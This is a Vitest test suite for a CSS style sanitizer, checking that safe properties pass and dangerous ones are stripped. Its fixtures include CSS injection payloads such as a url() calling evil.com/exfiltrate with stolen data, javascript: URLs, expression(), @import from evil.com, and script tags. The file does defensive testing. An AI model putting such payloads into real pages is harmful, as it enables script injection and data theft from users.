import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  sanitizeStyleObject,
  sanitizeStyleToString,
  sanitizeStyleString,
  sanitizeStyles,
} from './cssSanitizer';

describe('cssSanitizer', () => {
  let consoleWarnSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
  });

  afterEach(() => {
    consoleWarnSpy.mockRestore();
  });

  describe('sanitizeStyleObject', () => {
    it('should allow safe CSS properties', () => {
      const input = {
        color: 'red',
        'font-size': '14px',
        display: 'flex',
        'justify-content': 'center',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
        'font-size': '14px',
        display: 'flex',
        'justify-content': 'center',
      });
    });

    it('should normalize property names to lowercase', () => {
      const input = {
        Color: 'red',
        'Font-Size': '14px',
        DISPLAY: 'flex',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
        'font-size': '14px',
        display: 'flex',
      });
    });

    it('should block disallowed CSS properties', () => {
      const input = {
        color: 'red',
        'background-image': 'url(image.png)',
        position: 'absolute',
        behavior: 'url(script.htc)',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
        position: 'absolute',
      });
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Blocked disallowed property: background-image')
      );
    });

    it('should block url() in values', () => {
      const input = {
        background: 'url(http://evil.com/exfiltrate?data=stolen)',
        content: 'url(javascript:alert(1))',
        color: 'red',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
      });
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Blocked disallowed property: background')
      );
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Blocked disallowed property: content')
      );
    });

    it('should block expression() in values', () => {
      const input = {
        width: 'expression(alert(1))',
        color: 'red',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
      });
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Blocked dangerous pattern in width')
      );
    });

    it('should block javascript: protocol', () => {
      const input = {
        cursor: 'pointer',
        background: 'javascript:alert(1)',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        cursor: 'pointer',
      });
    });

    it('should block data: URIs', () => {
      const input = {
        color: 'red',
        background: 'data:image/svg+xml,<svg>...</svg>',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
      });
    });

    it('should block @import directives', () => {
      const input = {
        color: '@import url(http://evil.com/style.css)',
        'font-size': '14px',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        'font-size': '14px',
      });
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Blocked dangerous pattern in color')
      );
    });

    it('should block script tags in values', () => {
      const input = {
        content: '<script>alert(1)</script>',
        color: 'red',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
      });
    });

    it('should block event handlers', () => {
      const input = {
        width: 'onclick=alert(1)',
        color: 'red',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
      });
    });

    it('should block excessively long values', () => {
      const longValue = 'a'.repeat(1001);
      const input = {
        color: longValue,
        'font-size': '14px',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        'font-size': '14px',
      });
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Blocked excessively long value in color')
      );
    });

    it('should handle numeric values', () => {
      const input = {
        opacity: 0.5,
        'z-index': 100,
        width: '100px',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        opacity: '0.5',
        'z-index': '100',
        width: '100px',
      });
    });

    it('should allow all whitelisted layout properties', () => {
      const input = {
        display: 'grid',
        'grid-template-columns': 'repeat(3, 1fr)',
        gap: '1rem',
        'align-items': 'center',
        'justify-content': 'space-between',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual(input);
    });

    it('should allow all whitelisted typography properties', () => {
      const input = {
        color: '#333',
        'font-size': '16px',
        'font-weight': 'bold',
        'font-family': 'Arial, sans-serif',
        'text-align': 'center',
        'line-height': '1.5',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual(input);
    });

    it('should allow all whitelisted spacing properties', () => {
      const input = {
        margin: '1rem',
        'margin-top': '2rem',
        padding: '0.5rem',
        'padding-left': '1rem',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual(input);
    });

    it('should allow all whitelisted border properties', () => {
      const input = {
        border: '1px solid #ccc',
        'border-radius': '4px',
        'border-top-color': 'red',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual(input);
    });

    it('should allow background-color but not background-image', () => {
      const input = {
        'background-color': '#fff',
        'background-image': 'url(image.png)',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        'background-color': '#fff',
      });
    });
  });

  describe('sanitizeStyleToString', () => {
    it('should convert sanitized styles to string', () => {
      const input = {
        color: 'red',
        'font-size': '14px',
        display: 'flex',
      };

      const result = sanitizeStyleToString(input);

      expect(result).toBe('color: red; font-size: 14px; display: flex');
    });

    it('should handle undefined input', () => {
      const result = sanitizeStyleToString(undefined);
      expect(result).toBe('');
    });

    it('should filter out dangerous properties when converting to string', () => {
      const input = {
        color: 'red',
        'background-image': 'url(evil.com)',
        'font-size': '14px',
      };

      const result = sanitizeStyleToString(input);

      expect(result).toBe('color: red; font-size: 14px');
    });
  });

  describe('sanitizeStyleString', () => {
    it('should parse and sanitize style string', () => {
      const input = 'color: red; font-size: 14px; display: flex';

      const result = sanitizeStyleString(input);

      expect(result).toEqual({
        color: 'red',
        'font-size': '14px',
        display: 'flex',
      });
    });

    it('should filter dangerous values from style string', () => {
      const input = 'color: red; background: url(evil.com); font-size: 14px';

      const result = sanitizeStyleString(input);

      expect(result).toEqual({
        color: 'red',
        'font-size': '14px',
      });
    });

    it('should handle malformed style strings', () => {
      const input = 'color red; font-size: 14px; : invalid; display';

      const result = sanitizeStyleString(input);

      expect(result).toEqual({
        'font-size': '14px',
      });
    });

    it('should handle empty style strings', () => {
      const result = sanitizeStyleString('');
      expect(result).toEqual({});
    });
  });

  describe('sanitizeStyles', () => {
    it('should be an alias for sanitizeStyleToString', () => {
      const input = {
        color: 'red',
        'font-size': '14px',
      };

      const result1 = sanitizeStyles(input);
      const result2 = sanitizeStyleToString(input);

      expect(result1).toBe(result2);
    });
  });

  describe('edge cases', () => {
    it('should handle empty objects', () => {
      const result = sanitizeStyleObject({});
      expect(result).toEqual({});
    });

    it('should handle whitespace in values', () => {
      const input = {
        color: '  red  ',
        'font-size': ' 14px ',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        color: 'red',
        'font-size': '14px',
      });
    });

    it('should handle mixed case in property names', () => {
      const input = {
        'Font-Size': '14px',
        'TEXT-align': 'center',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        'font-size': '14px',
        'text-align': 'center',
      });
    });

    it('should block URL-like patterns in color properties', () => {
      const input = {
        color: 'url(http://evil.com)',
        'font-size': '14px',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        'font-size': '14px',
      });
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Blocked dangerous pattern in color')
      );
    });

    it('should allow transform property', () => {
      const input = {
        transform: 'rotate(45deg)',
        'transform-origin': 'center',
      };

      const result = sanitizeStyleObject(input);

      expect(result).toEqual({
        transform: 'rotate(45deg)',
        'transform-origin': 'center',
      });
    });
  });
});
